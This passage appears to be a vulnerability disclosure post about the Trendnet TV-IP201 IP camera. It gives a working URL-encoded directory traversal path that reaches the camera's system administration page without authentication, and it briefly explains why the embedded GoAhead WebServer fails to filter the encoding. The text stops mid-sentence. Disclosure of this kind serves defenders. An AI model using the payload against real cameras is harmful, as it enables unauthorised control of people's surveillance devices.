Subject: Directory traversal & authentication bypass of
	Trendnet TV-IP201

simply go to http://ipaddress of
camera/..%5C..%5C..%5C..%5C..%5C..%5C/config/tcfg_system.asp (system
administration page)

These cams use an embedded version of GoAhead WebServer which is
vulnerable to the above attack because they don't correctly filter URL
encoded substitutions for the '/' character. Original vulnerability
